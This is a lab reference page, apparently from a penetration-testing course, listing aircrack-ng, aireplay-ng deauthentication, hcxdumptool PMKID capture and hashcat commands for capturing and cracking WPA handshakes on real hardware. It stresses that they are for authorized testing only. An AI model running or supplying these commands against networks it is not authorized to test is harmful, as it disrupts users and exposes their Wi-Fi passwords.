# Wireless: live capture with real hardware

> **This is a hardware-only reference. None of the commands on this page run
> anywhere in this lab.** They require a physical, monitor-mode-capable
> wireless adapter, and you may only point them at **a network you own** or
> one you have **explicit written authorization** to test. Deauthenticating
> clients or attacking a network without that authorization is illegal.

## Why this doesn't run in Docker

`05-wireless-offline` gives you a pre-captured WPA handshake (`wpa.cap`) and
has you crack it offline with `aircrack-ng` / `hashcat`. That's the half of
wireless attacking that's safe and deterministic to package in a container.

The *other* half — actually capturing a handshake over the air — needs a
real radio in monitor mode, sending and receiving 802.11 frames on a
physical channel. Docker containers share the host's kernel and can be
handed a physical USB Wi-Fi adapter via device passthrough, but:

- There's no way to give a container "a wireless network to legitimately
  attack" — RF doesn't stop at a subnet boundary the way this lab's Docker
  network does, so it can't be sandboxed the way the other scenarios are.
- Monitor mode and packet injection require a specific chipset/driver
  combination on real hardware; behavior is host- and adapter-dependent in a
  way that can't be made to work reliably (or safely, from an isolation
  standpoint) inside a portable container image.

So this page documents the commands as reference material, for use on your
own equipment against your own network (or one you're authorized to test),
outside of and unrelated to this lab's Docker environment.

## What you need

- A wireless adapter with a chipset that supports **monitor mode** and
  **packet injection** (common recommendation: Atheros AR9271 or
  Ralink/MediaTek RT3070-based USB adapters).
- The `aircrack-ng` suite and `hcxtools`/`hcxdumptool` installed on the host
  doing the capturing (all already installed in this lab's attacker image,
  for the offline-cracking half).
- A network you own, or written authorization to test the target network.

## 1. Put the adapter into monitor mode

```bash
airmon-ng check kill        # stop processes (NetworkManager, wpa_supplicant)
                             # that will otherwise fight over the interface
airmon-ng start wlan0       # creates a monitor-mode interface, e.g. wlan0mon
```

## 2. Capture a handshake

```bash
airodump-ng wlan0mon                          # survey: find your target's
                                               # BSSID and channel
airodump-ng -c <channel> --bssid <BSSID> \
  -w capture wlan0mon                         # lock onto it and start
                                               # writing packets to capture-*.cap
```

Leave this running while a client associates (or reassociates) with the
access point — the 4-way handshake is exchanged at that moment and is what
gets written to the capture file.

## 3. Force a reauth (optional, speeds things up)

If you don't want to wait for a client to naturally reconnect, you can
deauthenticate an already-connected client so it reassociates (and
re-performs the handshake) while you're capturing:

```bash
aireplay-ng --deauth 5 -a <BSSID> -c <client-MAC> wlan0mon
```

This sends forged deauth frames — only ever do this against a network and
client you're authorized to test. It's disruptive by design.

## 4. Alternative: PMKID capture (no client needed)

Many access points hand over enough material to attack in a single frame
exchange with the AP itself, with no connected client required:

```bash
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

## 5. Convert for the offline workflow (same as scenario 05)

Both a 4-way-handshake capture and a PMKID capture get converted the same
way, into hashcat's combined WPA format (mode `22000`):

```bash
hcxpcapngtool -o capture.22000 capture.pcapng   # (or capture.cap)
hashcat -m 22000 capture.22000 wordlist.txt
```

Or, for a full 4-way handshake capture, `aircrack-ng` can crack the `.cap`
directly without conversion:

```bash
aircrack-ng -w wordlist.txt -b <BSSID> capture.cap
```

This is exactly the step `05-wireless-offline` walks you through against a
pre-generated capture for network `test` (BSSID `00:0D:93:EB:B0:8C`,
passphrase `biscotte`) — the difference in the field is only where the
`.cap`/`.pcapng` file came from: your own airodump-ng/hcxdumptool run
against real hardware, instead of the lab's generator container.

## Summary

| Step | Tool | Runs in this lab? |
|---|---|---|
| Monitor mode | `airmon-ng` | No — needs a physical adapter |
| Handshake capture | `airodump-ng` | No — needs a physical adapter |
| Forced reauth | `aireplay-ng --deauth` | No — needs a physical adapter |
| PMKID capture | `hcxdumptool` | No — needs a physical adapter |
| Convert capture | `hcxpcapngtool` | Yes — same tool used in `05-wireless-offline` |
| Offline crack | `aircrack-ng` / `hashcat -m 22000` | Yes — this is exactly `05-wireless-offline` |
